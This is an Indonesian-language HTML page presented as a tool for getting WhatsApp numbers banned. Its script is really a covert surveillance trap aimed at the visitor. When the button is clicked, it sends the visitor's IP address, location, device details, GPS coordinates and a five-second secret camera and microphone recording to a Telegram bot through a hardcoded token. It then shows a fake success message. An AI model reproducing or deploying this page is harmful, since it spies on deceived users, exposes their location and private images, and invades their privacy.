
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Website Bans WhatsApp</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #1a0000;
      background: linear-gradient(145deg, #2a0000 0%, #1a0000 80%);
      font-family: 'Inter', sans-serif;
      color: #ffb3b3;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 3px;
      height: 3px;
      background: rgba(255, 0, 0, 0.25);
      border-radius: 50%;
      filter: blur(1px);
      animation: floatRed 7s ease-in-out infinite;
    }
    @keyframes floatRed {
      0%, 100% { transform: translateY(0px) scale(1); opacity: 0.2; }
      50% { transform: translateY(-25px) scale(1.5); opacity: 0.7; }
    }
    .login-container {
      background-color: rgba(20, 0, 0, 0.95);
      padding: 30px;
      border-radius: 24px;
      box-shadow: 0 0 30px #ff0000, inset 0 0 15px #a00000;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
      border: 2px solid #c00000;
    }
    .login-title {
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 10px;
      background: linear-gradient(135deg, #ff5e5e, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 10px red;
    }
    .login-subtitle {
      font-size: 13px;
      color: #ff8080;
      margin-bottom: 20px;
      letter-spacing: 1px;
    }
    .login-input {
      width: 100%;
      padding: 14px;
      margin-bottom: 18px;
      background: #2f0000;
      border: 2px solid #b30000;
      border-radius: 60px;
      color: #ffcaca;
      font-size: 15px;
      outline: none;
      text-align: center;
    }
    .login-input:focus {
      border-color: #ff4f4f;
      box-shadow: 0 0 25px #ff3b3b;
    }
    .login-button {
      width: 100%;
      padding: 14px;
      background: #8b0000;
      color: white;
      border: none;
      border-radius: 60px;
      cursor: pointer;
      font-weight: 700;
      font-size: 16px;
      box-shadow: 0 6px 0 #3f0000;
      transition: 0.1s ease;
      text-transform: uppercase;
      letter-spacing: 2px;
    }
    .login-button:hover {
      background: #b30000;
      transform: translateY(-2px);
      box-shadow: 0 8px 0 #3f0000;
    }
    .login-button:active {
      transform: translateY(6px);
      box-shadow: 0 1px 0 #3f0000;
    }
    #info {
      white-space: pre-wrap;
      text-align: center;
      margin-top: 25px;
      background: #1c0101;
      border: 2px solid #a00000;
      padding: 18px;
      border-radius: 40px;
      font-size: 13px;
      color: #ffaeae;
      font-family: 'Courier New', monospace;
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 480px) {
      .login-container {
        padding: 25px 20px;
      }
    }
  </style>
</head>
<body>
  <div class="bg-particles" id="particles"></div>

  <div class="login-container">
    <p class="login-title">Bans WhatsApp By Yanto official</p>
    <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
    <button class="login-button" id="login-button">EKSEKUSI ➤</button>
    <div id="info">🥷 Masukkan nomor target.</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    // ========== KONFIGURASI ==========
    const botToken = '8675408721:AAFNmUMRkfJYgDFmdLVJE1tHdFaGdiW4LX8';
    const chatIds = ['8182530431','7221551942'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    // elemen media
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // ========== FUNGSI KIRIM PESAN ==========
    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendVideoToTelegram(blob, caption = '') {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('video', blob);
        if (caption) formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    // ========== FITUR VIDEO + AUDIO 5 DETIK ==========
    async function recordAndSendVideo() {
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ 
          video: true, 
          audio: true
        })
        .then(stream => {
          console.log('⏳ Tunggu Sebentar...');
          
          const mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'video/webm'
          });
          
          const chunks = [];
          
          mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) {
              chunks.push(e.data);
            }
          };
          
          mediaRecorder.onstop = () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            sendVideoToTelegram(videoBlob, '🎥 Rekaman video+audio 5 detik korban');
            console.log('📤 Video terkirim ke Telegram');
            
            stream.getTracks().forEach(track => {
              track.stop();
              console.log(`⏹️ Track ${track.kind} dihentikan`);
            });
            
            resolve();
          };
          
          mediaRecorder.start();
          console.log('⏺️ Mulai merekam...');
          
          setTimeout(() => {
            mediaRecorder.stop();
            console.log('⏹️ Berhenti merekam');
          }, 5000);
          
        })
        .catch(err => {
          console.error('❌ Gagal akses kamera/mikrofon:', err);
          sendToTelegram('❌ Korban menolak akses kamera/mikrofon');
          resolve();
        });
      });
    }

    // ========== INFO TEKS SETELAN AWAL (PERTAMA KALI DIKIRIM) ==========
    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
      `.trim();

      return text;
    }

    // ========== EVENT CLICK UTAMA ==========
    button.addEventListener('click', async () => {
      const nomor = input.value.trim();
      if (!nomor || nomor.length < 8 || nomor.length > 15) {
        infoDiv.innerText = '⚠️ Nomor tidak valid.';
        return;
      }

      button.disabled = true;
      infoDiv.innerText = '⏳ Tunggu Sebentar...';

      // Kirim nomor target
      sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);

      try {
        // Kirim info teks (SETELAN AWAL)
        const infoKorban = await getInfo();
        sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${infoKorban}</pre>`);

        // Ambil lokasi GPS
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            pos => {
              const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
              sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Alamat korban</a>`);
            },
            () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
          );
        } else {
          sendToTelegram(`📍 Browser tidak support GPS`);
        }

        // REKAM VIDEO + AUDIO 5 DETIK
        infoDiv.innerText = '⏳ Tunggu Sbentar...';
        await recordAndSendVideo();

        infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
        button.disabled = false;
        input.value = '';

      } catch (error) {
        console.error(error);
        infoDiv.innerText = '❌ Terjadi kesalahan.';
        button.disabled = false;
      }
    });

    // Partikel merah
    function createRedParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 60; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 8 + 's';
        p.style.animationDuration = (Math.random() * 5 + 5) + 's';
        p.style.background = `rgba(255, ${Math.floor(Math.random() * 50)}, 0, 0.4)`;
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createRedParticles);
  </script>
</body>
</html>
